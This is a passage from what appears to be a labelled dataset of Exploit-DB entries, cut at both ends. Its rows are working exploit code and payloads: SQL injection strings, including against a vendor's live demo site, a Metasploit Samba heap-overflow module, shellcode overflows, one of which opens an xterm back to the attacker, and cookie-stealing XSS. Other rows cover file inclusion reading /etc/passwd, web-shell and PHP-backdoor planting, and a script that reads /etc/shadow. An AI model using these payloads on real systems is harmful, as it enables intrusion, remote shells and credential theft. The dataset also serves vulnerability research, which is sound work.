exit();      break;   } }  close($sock);","[""'popup.php'""]",1
44698,"NewsBee CMS 1.4 - 'home-text-edit.php' SQL Injection # Exploit Title: NewsBee CMS 1.4 - 'home-text-edit.php' SQL Injection # Dork: N/A # Date: 2018-05-22 # Exploit Author: Özkan Mustafa Akkuş (AkkuS) # Vendor Homepage: https://codecanyon.net/item/newsbee-fully-featured-news-cms-with-bootstrasp-php-mysql/19404937 # Version: 1.4 / fourth update # Category: Webapps # Tested on: Kali linux  # PoC: SQLi: # Parameter: id # Type: boolean-based blind # Demo: http://target/NewsBee/admin/home-text-edit.php?id=5 # Payload:   Payload: id=5' AND 3563=3563 AND 'HmOW'='HmOW  # Type: error-based # Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) # Payload:  id=5' AND (SELECT 7446 FROM(SELECT COUNT(*),CONCAT(0x7178707871,(SELECT (ELT(7446=7446,1))),0x7176716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'rNYc'='rNYc  # Type: AND/OR time-based blind # Demo: http://target/NewsBee/admin/home-text-edit.php?id=5 # Payload:   id=5' AND SLEEP(5) AND 'KdYd'='KdYd  # Type: UNION query # Demo: http://target/NewsBee/admin/home-text-edit.php?id=5 # Payload:   id=-1714' UNION ALL SELECT NULL,NULL,CONCAT(0x7162787871,0x51487655536a566c616e5156496a6a56426267495670596f644f466f554753504469636d4358694c,0x71766a7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WSZd&t=gallery","[""'home-text-edit.php'""]",1
30490,"Microsoft Internet Explorer 5.0.1 - 'TBLinf32.dll' ActiveX Control Remote Code Execution source: https://www.securityfocus.com/bid/25289/info  The Microsoft Visual Basic 6 TypeLib Information Library (TLI) ActiveX control is prone to a remote code-execution vulnerability.  An attacker may exploit this issue by enticing victims into opening a maliciously crafted HTML document.  Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts will likely result in denial-of-service conditions.   <object width=1000 height=20 classid=""CLSID:<CLASSID>"" name=test></object> x= test.TypeLibInfoFromFile(""\\\\IPADDRESS\\SHARE\\remote.dll"") ' Call the remote DLLGetDocumentation function alert(x.Interfaces.Item(a).Members.Item(b).HelpString)","[""'TBLinf32.dll'""]",1
16875,"Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit) ## # $Id: lsa_transnames_heap.rb 9021 2010-04-05 23:34:10Z hdm $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::DCERPC 	include Msf::Exploit::Remote::SMB 	include Msf::Exploit::Brute  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Samba lsa_io_trans_names Heap Overflow', 			'Description'    => %q{ 				This module triggers a heap overflow in the LSA RPC service 			of the Samba daemon. This module uses the szone_free() to overwrite 			the size() or free() pointer in initial_malloc_zones structure. 			}, 			'Author'         => 				[ 					'ramon', 					'Adriano Lima <adriano@risesecurity.org>', 					'hdm' 				], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9021 $', 			'References'     => 				[ 					['CVE', '2007-2446'], 					['OSVDB', '34699'], 				], 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 1024, 				}, 			'Platform'       => 'osx', 			'DefaultOptions' => 				{ 					'PrependSetresuid' => true, 				}, 			'Targets'        => 				[ 					['Mac OS X 10.4.x x86 Samba 3.0.10', 					{ 						'Platform'      => 'osx', 						'Arch'          => [ ARCH_X86 ], 						'Nops'          => 4 * 1024, 						'Bruteforce' => 							{ 								'Start' => { 'Ret' => 0x01818000 }, 								'Stop'  => { 'Ret' => 0x01830000 }, 								'Step'  => 3351, 							}, 					} 					], 					['Mac OS X 10.4.x PPC Samba 3.0.10', 					{ 						'Platform'      => 'osx', 						'Arch'          => [ ARCH_PPC ], 						'Nops'          => 1600, 						'Bruteforce' => 							{ 								'Start' => { 'Ret' => 0x01813000 }, 								'Stop'  => { 'Ret' => 0x01830000 }, 								'Step'  => 796, 							} 					} 					], 					['DEBUG', 					{ 						'Platform'      => 'osx', 						'Arch'          => [ ARCH_X86 ], 						'Nops'          => 4 * 1024, 						'Bruteforce' => 							{ 								'Start' => { 'Ret' => 0xaabbccdd }, 								'Stop'  => { 'Ret' => 0xaabbccdd }, 								'Step'  => 0, 							} 					} 					], 				], 			'DisclosureDate' => 'May 14 2007' 			))  		register_options( 			[ 				OptString.new('SMBPIPE', [ true,  ""The pipe name to use"", 'LSARPC']), 			], self.class)  	end  	# Handle a strange byteswapping issue on PPC 	def ppc_byteswap(addr) 		data = [addr].pack('N') 		(data[1,1] + data[0,1] + data[3,1] + data[2,1]).unpack('N')[0] 	end  	def brute_exploit(target_addrs)  		if(not @nops) 			if (target['Nops'] > 0) 				print_status(""Creating nop sled...."") 				@nops = make_nops(target['Nops']) 			else 				@nops = '' 			end 		end  		print_status(""Trying to exploit Samba with address 0x%.8x..."" % target_addrs['Ret'])  		pipe = datastore['SMBPIPE'].downcase  		print_status(""Connecting to the SMB service..."") 		connect() 		smb_login()  		datastore['DCERPC::fake_bind_multi'] = false  		handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [""\\#{pipe}""]) 		print_status(""Binding to #{handle} ..."") 		dcerpc_bind(handle) 		print_status(""Bound to #{handle} ..."")  		num_entries  = 256 		num_entries2 = 257  		# 		# First talloc_chunk 		# 16 bits align 		# 16 bits sid_name_use 		#     16 bits uni_str_len 		#     16 bits uni_max_len 		#     32 bits buffer 		# 32 bits domain_idx 		# 		buf = (('A' * 16) * num_entries)  		# Padding 		buf << 'A' * 4  		# 		# Use the szone_free() to overwrite the size() pointer in 		# initial_malloc_zones structure. 		# 		size_pointer = 0x1800008  		# Initial nops array 		nops = ''  		# x86 		if (target.arch.include?(ARCH_X86))  			# 			# We don't use the size() pointer anymore because it 			# results in a unexpected behavior when smbd process 			# is started by launchd. 			# 			free_pointer = 0x1800018 			nop = ""\x16""  			# 			# First talloc_chunk 			# 16 bits align 			# 16 bits sid_name_use 			#     16 bits uni_str_len 			#     16 bits uni_max_len 			#     32 bits buffer 			# 32 bits domain_idx 			#  			# First nop block 			buf = ((nop * 16) * num_entries)  			# 			# A nop block of 0x16 (pushl %ss) and the address of 			# 0x1800014 results in a jns instruction which when 			# executed will jump over the address written eight 			# bytes past our target address by szone_free() (the 			# sign flag is zero at the moment our target address is 			# executed). 			# 			# 0x357b ^ ( 0x1800014 ^ 0x16161616 ) = 0x17962379 			# 			# This is the output of the sequence of xor operations 			#   0:   79 23                   jns    0x25 			#   2:   96                      xchgl  %eax,%esi 			#   3:   17                      popl   %ss 			#   4:   16                      pushl  %ss 			#   5:   16                      pushl  %ss 			#   6:   16                      pushl  %ss 			#   7:   16                      pushl  %ss 			#   8:   14 00                   adcb   $0x0,%al 			#   a:   80 01 16                addb   $0x16,(%ecx) 			# 			# This jump is needed because the ecx register does not 			# point to a valid memory location in free() context 			# (it is zero). 			# 			# The jump will hit our nop block which will be executed 			# until it reaches the payload. 			#  			# Padding nops 			buf << nop * 2  			# Jump over the pointers 			buf << ""\xeb\x08""  			# Pointers 			buf << [target_addrs['Ret']].pack('V') 			buf << [free_pointer - 4].pack('V')  			# 			# We expect to hit this nop block or the one before 			# the pointers. 			# 			buf << nop * (3852 - 8 - payload.encoded.length)  			# Payload 			buf << payload.encoded  			# Padding nops 			buf << nop * 1024  			stub = lsa_open_policy(dcerpc)  			stub << NDR.long(0)            # num_entries 			stub << NDR.long(0)            # ptr_sid_enum 			stub << NDR.long(num_entries)  # num_entries 			stub << NDR.long(0x20004)      # ptr_trans_names 			stub << NDR.long(num_entries2) # num_entries2 			stub << buf  		# PPC 		else  			# 			#  The first half of the nop sled is an XOR encoded branch 			#  instruction. The second half is a series of unencoded nop 			#  instructions. The result is: 			# 			#  > This is the decoded branch instruction 			#  0x181c380:      bl      0x181c6a0 			# 			#  > The size pointer is written below this 			#  0x181c384:      .long 0x1800004 			# 			#  > Followed by the encoded branch sled 			#  0x181c388:      ba      0x180365c 			#  [ ... ] 			# 			#  > The branch lands in the normal nop sled 			#  0x181c6a0:      andi.   r17,r16,58162 			#  [ ... ] 			# 			#  > Finally we reach our payload :-) 			#  			size_pointer = size_pointer - 4  			sled = target['Nops'] 			jump = [ 0x357b ^ ( size_pointer ^ (0x48000001 + sled / 2 )) ].pack('N') 			nops = (jump * (sled / 8)) + @nops[0, sled / 8]  			addr_size = ppc_byteswap(size_pointer) 			addr_ret  = ppc_byteswap(target_addrs['Ret'])  			# This oddness is required for PPC 			buf << [addr_size].pack('N') 			buf << [addr_ret ].pack('N')[2,2] 			buf << [addr_ret ].pack('N')  			# Padding 			buf << ""A"" * (256 - 10)  			stub = lsa_open_policy(dcerpc)  			stub << NDR.long(0)            # num_entries 			stub << NDR.long(0)            # ptr_sid_enum 			stub << NDR.long(num_entries)  # num_entries 			stub << NDR.long(0x20004)      # ptr_trans_names 			stub << NDR.long(num_entries2) # num_entries2 			stub << buf 			stub << nops 			stub << payload.encoded 		end  		print_status(""Calling the vulnerable function..."")  		begin 			# LsarLookupSids 			dcerpc.call(0x0f, stub) 		rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError 			print_status('Server did not respond, this is expected') 		rescue Rex::Proto::DCERPC::Exceptions::Fault 			print_error('Server is most likely patched...') 		rescue => e 			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/ 				print_status('Server disconnected, this is expected') 			else 				print_error(""Error: #{e.class}: #{e}"") 			end 		end  		handler 		disconnect 	end  	def lsa_open_policy(dcerpc, server=""\\"")  		stubdata = 			# Server 			NDR.uwstring(server) + 			# Object Attributes 				NDR.long(24) + # SIZE 				NDR.long(0)  + # LSPTR 				NDR.long(0)  + # NAME 				NDR.long(0)  + # ATTRS 				NDR.long(0)  + # SEC DES 					# LSA QOS PTR 					NDR.long(1)  + # Referent 					NDR.long(12) + # Length 					NDR.long(2)  + # Impersonation 					NDR.long(1)  + # Context Tracking 					NDR.long(0)  + # Effective Only 			# Access Mask 			NDR.long(0x02000000)  		res = dcerpc.call(6, stubdata)  		dcerpc.last_response.stub_data[0,20] 	end  end","[""'lsa_io_trans_names'""]",1
31564,"Jack (tR) Jax LinkLists 1.00 - 'jax_linklists.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/28518/info  Jax LinkLists is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Jax LinkLists 1.00 is vulnerable; other versions may also be affected.  http://www.example.com/scripting/php/linklists/linklists/jax_linklists.php?do=list&list_id=0&language=german&cat=""><script>alert()</script>","[""'jax_linklists.php'""]",1
9351,"Payment Processor Script (PPScript) - 'shop.htm cid' SQL Injection [~] PaymentProcessorScript.net R-Sql/B-Sql Multiple Vulns. [~] [~]---------------------------------------------------------- [~] Discovered By: ZoRLu  msn: trt-turk@hotmail.com [~] [~] Date: 04.01.09 [~] [~] Home: z0rlu.blogspot.com / www.experl.com  [~] [~] N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : ( ( [~] [~] EN ONEMLi N0T: demolarI hackleyen top olsun top ( if you hack demo you will be ball xD ) [~] -----------------------------------------------------------  R-Sql  http://z0rlu.blogspot.com/shop.htm?cid=999999999+union+select+1,2,concat(user(),0x3a,version(),0x3a,database())  for demo:  http://paymentprocessorscript.net/demo/shop.htm?cid=999999999+union+select+1,2,concat(user(),0x3a,version(),0x3a,database())  B-Sql  http://z0rlu.blogspot.com/shop.htm?cid=[id]+and+1=1    true  http://z0rlu.blogspot.com/shop.htm?cid=[id]+and+1=100  false  for demo:  http://paymentprocessorscript.net/demo/shop.htm?cid=31+and+1=1  http://paymentprocessorscript.net/demo/shop.htm?cid=31+and+1=100   [~]---------------------------------------------------------------------- [~] Greetz tO: str0ke & Scriptorium & h4ckinger & Cyber_Thief & BLaSTeR & Ahmet and all experl.com users  :)  [~] [~] yildirimordulari.org  &  experl.com [~] [~]----------------------------------------------------------------------  # milw0rm.com [2009-08-03]","[""'shop.htm cid'""]",1
20308,"Samba 1.9.19 - 'Password' Remote Buffer Overflow // source: https://www.securityfocus.com/bid/1816/info  Samba is an open source software suite that provides seamless file and print services to SMB/CIFS clients. Certain older versions of Samba had a remotely exploitable buffer overflow vulnerability. This vulnerability was in the password function of the authentication mechanism which is to say a user could supply an overly long password to the Samba server and trigger a buffer overflow.  */  /* Note i have include a little utility pinched from ADMtoolz  for get the netbios name    -------------------------------------------------------------------------- ------------------------------[ADMnmbname.c]----------------------------------   --------------------------------------------------------------------------  */   #define DEFAULT_OFFSET 3500 #define DEFAULT_BUFFER_SIZE 3081 #define NOP 0x90 #define NMBHDRSIZE 13 #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <fcntl.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/wait.h> #include <sys/ioctl.h> #include <sys/stat.h> #include <netdb.h> #include <netinet/in.h> #include <netinet/ip.h> #include <netinet/ip_icmp.h> #include <netinet/ip_tcp.h>  struct nmbhdr { unsigned short int id;  unsigned char  R:1; unsigned char  opcode:4; unsigned char  AA:1; unsigned char  TC:1; unsigned char  RD:1; unsigned char  RA:1; unsigned char  unless:2; unsigned char  B:1; unsigned char  RCODE:4;   unsigned short int que_num; unsigned short int rep_num; unsigned short int num_rr; unsigned short int num_rrsup; unsigned char namelen; };   struct typez{ u_int type; u_int type2; };   unsigned int host2ip(char *serv) { struct sockaddr_in sin; struct hostent *hent;  hent=gethostbyname(serv); if(hent == NULL) return 0; bzero((char *)&sin, sizeof(sin)); bcopy(hent->h_addr, (char *)&sin.sin_addr, hent->h_length); return sin.sin_addr.s_addr; }    main( int argc, char  **argv) { struct sockaddr_in  sin_me , sin_dst; struct nmbhdr *nmb,*nmb2; struct iphdr *ipz; struct typez  *typz; struct hostent *hent; int socket_client,sr,num,i=1,bha,timeout=0,try=0,GO=0; int longueur=sizeof(struct sockaddr_in); char  *data; char  *dataz; char   buffer[1024]; char   buffer2[1024]; char   namezz[1024]; char   name[64]=""CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0""; char   c;  if(argc <2) {         printf(""usage: ADMnmbname <ip of the victim>\n"");         exit (0);         }   socket_client=socket(AF_INET,SOCK_DGRAM,17); sr=socket(AF_INET,SOCK_RAW,17); ioctl(sr,FIONBIO,&i);   sin_me.sin_family=AF_INET; sin_me.sin_addr.s_addr=htonl(INADDR_ANY); sin_me.sin_port=htons(2600);  sin_dst.sin_family=AF_INET; sin_dst.sin_port=htons(137); sin_dst.sin_addr.s_addr = host2ip(argv[1]);  nmb = (struct nmbhdr *)  buffer; data = (char *)(buffer+NMBHDRSIZE); typz = (struct typez *)(buffer+NMBHDRSIZE+33); nmb2 = (struct nmbhdr *)(buffer2+20+8); ipz   = (struct iphdr *)buffer2; dataz = (char *)(buffer2+50+7+20+8);  memset(buffer,0,1024); memset(buffer2,0,1024); memset(namezz,0,1024); memcpy(data,name,33);             /* play with the netbios query format :) */  nmb->id=0x003; nmb->R=0;                  /* 0 for question 1 for response */ nmb->opcode=0;             /* 0 = query */ nmb->que_num=htons(1);     /* i have only 1 question :) */ nmb->namelen=0x20; typz->type=0x2100; typz->type2=0x1000;  sendto(socket_client,buffer,50,0,(struct sockaddr *)&sin_dst,longueur);      for(timeout=0;timeout<90;timeout++ )   {            usleep(100000);            buffer2[0]='0';            recvfrom(sr,buffer2,800,0,(struct sockaddr *)&sin_dst,&(int)longueur);          if(buffer2[0]!='0')                 {                              if(nmb2->rep_num!=0)                             {                             bha=0;                                       for(;;)                                      {                                          c=*(dataz+bha);                                         if(c!='\x20')                                                         {                                                          namezz[bha]=c;                                                         bha++;                                                          }                                         if(c=='\x20')break;                                    }                                   printf(""netbios name of %s is %s\n"",argv[1],namezz);                                 try =4;                                 GO = 4;                                  break;                               }                 }        }     memset(buffer,0,1024); memset(buffer2,0,1024);  }  /*  --------------------------------------------------------------------------- ----------------------------[ADMkillsamba.c]---------------------------------  ---------------------------------------------------------------------------           generic buffer overflow ameliored for samba sploit  the sploit send a xterm to your machine .  hey dont forget to do a  xhost +IP-OF-VICTIM  !!!!  and put the the sploit to the same directory of  the special smbclient !   */   /* diz default offset and buffer size Work fine on a my system Redhat 4.2  with samba server  1.9.17alpha5 < the last version !> i have tested on other system with this deffautl buff & size  smb 1.9.16p[9-11] the default srv on redhat 4.1 4.2  but somtime you need to change the  buffer size and offset   try a buffer of ( 1050<buffer >1100) and a offset ( 1500<off >2500)  mail me at admsmb@hotmail.com if u wanna some help */      #define DEFAULT_OFFSET 3500 #define DEFAULT_BUFFER_SIZE 3081 #define NOP 0x90 #include <stdlib.h> #include <strings.h>  unsigned char shellcode[500] =  ""\xeb\x2f\x5f\xeb\x4a\x5e\x89\xfb\x89\x3e\x89\xf2\xb0\xfe\xae\x74"" ""\x14\x46\x46\x46\x46\x4f\x31\xc9\x49\xb0\xff\xf2\xae\x30\xc0\x4f"" ""\xaa\x89\x3e\xeb\xe7\x31\xc0\x89\x06\x89\xd1\x31\xd2\xb0\x0b\xcd"" ""\x80\xe8\xcc\xff\xff\xff"";  unsigned long get_sp(void) {    __asm__(""movl %esp,%eax""); }  void main(int argc, char *argv[]) {   char *buff, *ptr;   long *addr_ptr, addr;   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;   char netbios_name[100];    char bufferz[255];   char ipz[40];   char myipz[40];   unsigned char bla[50] = ""\xfe\xe8\xb1\xff\xff\xff"";   int *ret;   unsigned char cmd[50]=""/usr/bin/X11/xterm\xff-display\xff"";   unsigned char arg1[50];   char arg2[50]=""bhahah\xff"";     int i,pid;    bzero(netbios_name,100);   bzero(bufferz,255);   bzero(ipz,40);   bzero(ipz,40);    if(argc <4){   printf("" usage: ADMkillsamba <ip of the victim> <netbios name> <your ip> [buff size] [offset size]\n"");   printf(""<ip of victim> = 11.11.11.11  ! THe numerical IP  Only ! not www.xxx.cc !\n"");   printf(""<netbios name> = VICTIME    for get the netbios name use ADMnmbname or ADMhack\n"");   printf(""<your ip> = the sploit send a xterm to your machine heh \n"");   printf(""option:\n"");   printf(""[buff size] = the size of the buffer to send default is 3081 try +1 -1 to a plage of +10 -10\n"");   printf(""[offset size] = the size of the offset default is 3500 try +50 -50 to a plage of 1000 -1000\n"");   printf("" HaVe Fun\n"");   exit(0);   }      sprintf(arg1,""%s:0\xff-e\xff/bin/sh\xff"",argv[3]);      shellcode[4] =(unsigned char)0x32+strlen(cmd)+strlen(arg1);     bla[2] =(unsigned char) 0xc9-strlen(cmd)-strlen(arg1);   printf(""4 byte = 0x%x\n"",shellcode[4]);  printf(""5 byte = 0x%x\n"",bla[2]);    strcat(shellcode,cmd);   strcat(shellcode,arg1);   strcat(shellcode,bla);   strcat(shellcode,""xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"");  //  printf(""%s\n"",shellcode);    strcpy(ipz,argv[1]);                   /* haha u can overflow my sploit :) */   strcpy(netbios_name,argv[2]);     if (argc > 4) bsize  = atoi(argv[4]);   if (argc > 5) offset = atoi(argv[5]);    if (!(buff = malloc(bsize))) {     printf(""Can't allocate memory.\n"");     exit(0);   }  sprintf(bufferz,""\\\\\\\\%s\\\\IPC$"",netbios_name);     addr =  0xbffffff0 - offset ;   printf(""Using address: 0x%x\n"", addr);    ptr = buff;   addr_ptr = (long *) ptr;   for (i = 0; i < bsize; i+=4)     *(addr_ptr++) = addr;    for (i = 0; i < bsize/4; i++)     buff[i] = NOP;    ptr = buff + ((bsize/4) - (strlen(shellcode)/2));   for (i = 0; i < strlen(shellcode); i++)     *(ptr++) = shellcode[i];    buff[bsize - 1] = '\0';    execl(""./smbclient"",""smbclient"",bufferz,buff,""-I"",ipz,NULL);     }","[""'Password'"", 'netbios']",1
3488,"PHP 4.4.6 - 'ibase_connect()' Local Buffer Overflow <?php  // PHP <= 4.4.6 ibase_connect() & ibase_pconnect() local buffer overflow  // poc exploit  // windows 2000 sp3 en / seh overwrite // by rgod // site: http://retrogod.altervista.org   if (!extension_loaded(""interbase"")){ die(""only works with interbase extension ""); }  $____scode= ""\xeb\x1b"". ""\x5b"". ""\x31\xc0"". ""\x50"". ""\x31\xc0"". ""\x88\x43\x59"". ""\x53"". ""\xbb\xca\x73\xe9\x77"". //WinExec ""\xff\xd3"". ""\x31\xc0"". ""\x50"". ""\xbb\x5c\xcf\xe9\x77"". //ExitProcess ""\xff\xd3"". ""\xe8\xe0\xff\xff\xff"". ""\x63\x6d\x64"". ""\x2e"". ""\x65"". ""\x78\x65"". ""\x20\x2f"". ""\x63\x20"". ""start notepad & "";  $jmp=""\xeb\xa1\xff\xeb""; // jmp short $eip=""\x86\xa0\xf8\x77""; // call ebx, ntdll.dll $____suntzu=str_repeat(""A"",2676 - strlen($____scode)); $____suntzu.=str_repeat(""\x90"",190).$____scode.str_repeat(""\x90"",10).$jmp.$eip; ibase_connect($____suntzu);  ?>  # milw0rm.com [2007-03-15]","[""'ibase_connect()'""]",1
3004,"eNdonesia 8.4 - '/mod.php/friend.php/admin.php' Multiple Vulnerabilities bugs for Endonesia8.4  FInd:z1ckX(ru) mail:map-master@mail.ru 1) http://localhost/en/mod.php?mod=[XSS]&op=viewlink&cid=5 2) http://localhost/en/friend.php your Friend:[XSS] 3) http://localhost/en/admin.php Main Text: [XSS] 4) http://localhost/en/mod.php?mod=informasi&op=showinfo&intypeid= ><script>document.write(document.cookie)</script> 5) http://localhost/en/mod.php?mod=../../../../../etc/passwd%00 6) http://localhost/en/mod.php?mod=diskusi&op=viewdisk&did=-4%20union%20select%200,0,name,0,pwd,0,0%20from%20authors/* - LOGIN AND PASS (MD5) 7) http://localhost/en/mod.php?mod=katalog&op=viewlink&cid=-2%20union%20select%200,pwd,0%20from%20authors%20where%20counter=1/* 8) http://localhost/en/mod.php?mod=diskusi&op=viewcat&cid=-2%20union%20select%200,0,0/*  -=====SHELL====- http://localhost/en/mod.php?mod=diskusi&op=viewdisk&did=-4 %20union%20select%200,0,'<? system($cmd)?>',0,0,0,0%20from%20authors into outfile '/home/localhost/www/en/cmd.php'/*  -======dork=====- inurl:mod.php?mod=diskusi&op=     # milw0rm.com [2006-12-25]","[""'/mod.php/friend.php/admin.php'""]",1
19765,"Corel Linux OS 1.0 - 'setxconf' Local Privilege Escalation source: https://www.securityfocus.com/bid/1008/info  A vulnerability exists in the setxconf utility, as shipped with Corel Linux 1.0. The -T option to setxconf will run xinit, which euid root. xinit, when executed, will invoke the contents on ~/.xserverrc. A malicious user could therefore execute commands as root.  cat > ~/.xserverrc echo ""+ +"" > /.rhosts","[""'setxconf'""]",1
31535,phpBB PJIRC Module 0.5 - 'irc.php' Local File Inclusion source: https://www.securityfocus.com/bid/28446/info  The PJIRC module for phpBB is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability using directory-traversal strings to view files and execute local scripts in the context of the webserver process. This may aid in further attacks.  http://www.example.com/forum/irc/irc.php?phpEx=./../../../../../../etc/passwd,"[""'irc.php'""]",1
7781,"Oracle Secure Backup 10g - 'exec_qr()' Command Injection Oracle Secure Backup 10g Remote Code Execution ==============================================  Product Description ===================  Oracle Secure Backup is a centralized tape backup management software providing secure data protection for heterogeneous file systems and the Oracle Database.  Summary =======  The Oracle January 2009 Critical Patch Update fixes a vulnerability which allows a remote preauthenticated attacker to execute arbitrary code in the context of the user running the web server of Oracle Secure Backup.  In Windows environments, the vulnerability allows execution of arbitrary code as SYSTEM. In Unix and GNU/Linux environments, however, just as a normal user (oracle usually).  CVSS2 Risk Score ================  Microsoft Windows: 10 Linux and Unix   :  7,5  Affected versions =================  Oracle Secure Backup version 10.1.0.3 to 10.2.0.2 in all supported operating systems are affected.  Vulnerability Details =====================  Oracle Secure Backup comes with one PHP based frontend which is vulnerable to a variable poisoning attack regardless if the PHP directive register_globals is  enabled or not.  Internally, all the variables passed to the script login.php are converted to global variables in the file $ROOT\php\globals.php. Any variable regarding or regardless the method used to send the query will be registered as a global variable.  From the login script called ""login.php"" the tool ""obt.exe"" is executed with a popen call passing arguments received from the client. These arguments are not sanitized nor verified and it allows post-authentication remote command execution BUT due to a logic failure in the script ""login.php"" when the variable ""clear"" has the value ""no"" and other variables (that supposedly comes from a cookie) are set anyone can execute operating system command from remote without being authenticated. The vulnerable code is the following:  (...)     if (strlen($ora_osb_bgcookie) > 0 && $button == ""Logout"")       {       // Turn DEBUG_EXEC to off       $tmp = $DEBUG_EXEC;       $DEBUG_EXEC = ""no"";        // Teminate the connection.       $qr_command = ""$rbtool --terminate $ora_osb_bgcookie-$ora_osb_lcookie"";       $msg = exec_qr(""$qr_command"");        if (strncmp($msg[0], ""Error:"", 6))         {         // Set the cookie up.         setcookie(""ora_osb_bgcookie"", """");         setcookie(""ora_osb_lcookie"", """");         $ora_osb_bgcookie = """";         }        // Reset DEBUG_EXEC.       $DEBUG_EXEC = $dtmp;       }     header(""Location: /login.php?clear=yes"");     } (...)  The function ""exec_qr"" internally calls the function PHP function ""popen"" to execute a command. The $rbtool variable, abusing from the variable poisoning attack, can be changed to, in example, /bin/sh or cmd.exe to execute arbitrary commands without the need for a user name or password, just with network access to the Oracle Secure Backup Web server. In fact, the script thinks that we're doing a logout.  Proof of Concept ================  * Create a file in the directory ""c:\""  https://<target>/login.php?clear=no&ora_osb_lcookie=aa&ora_osb_bgcookie=bb&button=Logout&rbtool=cmd.exe+/c+echo+hello+world+%3E+c:\oracle.secure.backup.txt+;  * Create a PHP backdoor  https://<target>/login.php?clear=no&ora_osb_lcookie=aa&ora_osb_bgcookie=bb&button=Logout&rbtool=cmd.exe+/c+echo+%22%3C%3Fphp+print(shell_exec(%24_GET%5B'a'%5D))%3B+%3F%3E%22+%3E+test.php%3B%26%26+echo  Workaround ==========  Disable the web server.  Patch information =================  Oracle fixed the vulnerability in version 10.2.0.3 of Oracle Secure Backup.  Contact Information ===================  The vulnerability was found by Joxean Koret, admin[at]joxeankoret[dot]com  References ==========  Oracle Secure Backup exec_qr() Command Injection Vulnerability: http://www.zerodayinitiative.com/advisories/ZDI-09-003/  Oracle Critical Patch Update January 2009: http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2009.html  Permanent Version of the advisory: http://joxeankoret.com/blog/?p=39  Professional Web: http://www.joxeankoret.com  Personal Blog: http://www.joxeankoret.com/blog  Disclaimer ==========  The information in this advisory and any of its demonstrations is provided ""as is"" without any warranty of any kind.  I am not liable for any direct or indirect damages caused as a result of using the information or demonstrations provided in any part of this advisory.  # milw0rm.com [2009-01-14]","[""'exec_qr()'""]",1
47337,"IntelBras TELEFONE IP TIP200/200 LITE 60.61.75.15 - Arbitrary File Read #!/usr/bin/perl -w # #  IntelBras TELEFONE IP TIP200/200 LITE 60.61.75.15 'dumpConfigFile' Pre-Auth Remote Arbitrary File Read # #  Todor Donev 2019 (c) <todor.donev at gmail.com> # # #  Disclaimer: #  This or previous programs are for Educational purpose ONLY. Do not use it without permission.  #  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages  #  caused by direct or indirect use of the  information or functionality provided by these programs.  #  The author or any Internet provider  bears NO responsibility for content or misuse of these programs  #  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss,  #  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's  #  responsibility. #    #  Use them at your own risk! # #  [test@localhost intelbras]$ perl intelbras_telefone_ip_tip_200_200_lite.pl  # #  # IntelBras TELEFONE IP TIP200/200 LITE 60.61.75.15 'dumpConfigFile' Pre-Auth Remote Arbitrary File Read #  # ======================================================================================================== #  # Author: Todor Donev 2019 (c) <todor.donev at gmail.com> #  # ======================================================================================================== #  # >  Authorization => Basic dXNlcjp1c2Vy #  # >  User-Agent => Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC) #  # >  Content-Type => application/x-www-form-urlencoded #  # <  Accept-Ranges => bytes #  # <  Server => SIPPhone #  # <  Content-Type => text/html;charset=UTF-8 #  # <  Expires => -1 #  # <  Client-Date => Sun, 01 Sep 2019 13:37:00 GMT #  # <  Client-Peer => 192.168.1.1 #  # <  Client-Response-Num => 1 #  # ======================================================================================================== #  root:$1$IJZx7biF$BgyHlA/AgR27VSEBALpqn1:11876:0:99999:7::: #  admin:$1$Bwt9zCNI$7rGLYt.wk.axE.6FUNFZe.:11876:0:99999:7::: #  guest:$1$A3lIJ0aO$Is8Ym.J/mpNejleongGft.:11876:0:99999:7::: # #  # ======================================================================================================== #  [test@localhost intelbras]$  #  #  Simple Mode: #  perl intelbras_telefone_ip_tip_200_200_lite.pl | grep -v ""^#"" # use strict; use v5.10; use HTTP::Request; use LWP::UserAgent; use WWW::UserAgent::Random;  my $host = shift || ''; my $file = shift || '/etc/shadow'; my $user = shift || 'user'; my $pass = shift || 'user';  print "" # IntelBras TELEFONE IP TIP200/200 LITE 60.61.75.15 \'dumpConfigFile\' Pre-Auth Remote Arbitrary File Read # ======================================================================================================== # Author: Todor Donev 2019 (c) <todor.donev at gmail.com> ""; if ($host !~ m/^http/){ print  ""# e.g. perl $0 https://target:port/ /etc/shadow user user # e.g. perl $0 https://target:port/ /phone/factory/user.ini user user # e.g. perl $0 https://target:port/ 